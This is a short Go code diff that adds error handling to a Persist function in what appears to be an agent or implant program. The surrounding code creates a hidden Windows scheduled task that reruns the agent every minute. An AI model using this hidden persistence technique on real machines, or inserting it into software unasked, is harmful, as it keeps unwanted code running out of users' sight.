@@ -33,7 +33,10 @@ func moveAgentExecutable(currentAgentPath string) error {
 
 func Persist(currentAgentPath string) error {
 	log.Printf("persisting")
-	moveAgentExecutable(currentAgentPath)
+	err := moveAgentExecutable(currentAgentPath)
+	if err != nil {
+		return err
+	}
 	cmd := exec.Command("schtasks", "/create", "/tn", conf.TaskName, "/tr", conf.Path, "/sc", "minute", "/f")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	out, err := cmd.CombinedOutput()
